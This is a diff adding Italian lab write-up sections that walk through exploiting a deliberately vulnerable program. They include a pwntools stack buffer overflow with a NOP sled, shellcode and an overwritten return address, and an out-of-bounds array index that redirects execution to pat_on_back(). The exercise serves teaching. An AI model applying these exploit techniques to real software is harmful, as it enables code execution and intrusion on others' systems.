@@ -280,10 +280,82 @@ ripetendo gli stessi passaggi per quanto riguarda la versione a 64 bit, usando p
   <img src="img/chX2_payload_test.png" caption = "Sequenza ciclica" width="500">
 </p>
 
-Dopodiché, si trova il numero della sequenza ciclica della stringa ciclica all'interno di RET
+Dopodiché, si trova il numero della sequenza ciclica della stringa ciclica all'interno di EIP
 
 <p align="center">
   <img src="img/chX2_cyclic_location.png" caption = "Sequenza ciclica" width="500">
 </p>
 
+a questo punto non resta che creare il paylaod, in questo caso un echo
+
+```python
+s_code = shellcraft.i386.linux.echo("Hello world!") + shellcraft.i386.linux.exit()
+s_code_asm = asm(s_code)
+
+ret_addr = 0xffffcd20 - 535
+addr = p32(ret_addr, endian ='little')
+
+nop = asm('nop', arch = 'i386')
+
+payload = b"2\n" + b"A"*1022
+
+payload += nop*(535 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr
+
+with open("./payload_challenge_extra2", "wb") as f: 
+	f.write(payload)
+```
+e attaccare l'applicativo
+
+<p align="center">
+  <img src="img/chX2_success.png" caption = "SuccessChX2" width="500">
+</p>
+
 ### 3. attaccare il buffer overflow nell'array globale `ptrs` (versione 32 bit), fare eseguire la funzione `pat_on_back()`
+
+Sempre nella versione a 32 bit, adesso proviamo ad accedere, mediante l'array del menù principale, alla funzione `pat_on_back()`, contentua all'interno del puntatore `p`.
+
+Il nostro obiettivo sarà quello di inserire l'indirizzo di `pat_on_back()` all'interno dell'array `ptrs`. Questo è possibile andando a fornire in ingresso alla funzione `read()` un indice tale per cui `ptrs[indice]` punti al valore di `p`, che a sua volta punta alla funzione `pat_on_back()`
+
+La variabile `p` è all'interno dello stack del main, mentre `ptrs`, essendo un array globale, si trova nel segmento .data. 
+
+l'indice `s` per l'operazione `ptrs[s] `viene calcolato come:` Indirizzo_di_p = Indirizzo_di_ptrs + (s * dimensione_puntatore)`
+
+Per determinare quindi il valore da inserire come indice, dobbiamo calcolare la distanza tra `p` e `ptrs` in questo modo
+
+`s = (Indirizzo_di_p - Indirizzo_di_ptrs) / 4 (byte)`
+
+otteniamo quindi gli indirizzi di `p` e di `ptrs` tramite `gdb`. Inseriamo un breakpoint prima dell'esecuzione della funzione `read()`
+
+<p align="center">
+  <img src="img/chX3_breakpoint.png" caption = "ptrs" width="500">
+</p>
+
+dopodiché, vanno estratti gli indirizzi di `p` e di `ptrs` tramite `gdb`
+
+<p align="center">
+  <img src="img/chX3_addresses.png" caption = "ptrs" width="500">
+</p>
+
+a questo punto va creato il payload. 
+
+```python
+
+p_addr = 0xffffd02c
+ptrs_addr = 0x56559094
+
+addr = p_addr - ptrs_addr
+addr //= 4
+
+payload = str(addr).encode() + b"\n"
+
+with open("./payload_challenge_extra3", "wb") as f: 
+    f.write(payload)
+
+print(f"[+] Payload generato con successo! Contenuto: {payload}")
+```
+
+Una volta generato il payload, a questo punto non ci resta altro che prelevare l'informazione ed eseguire l'attacco.
+
+<p align="center">
+  <img src="img/chX3_success.png" caption = "SuccessChX3" width="500">
+</p>
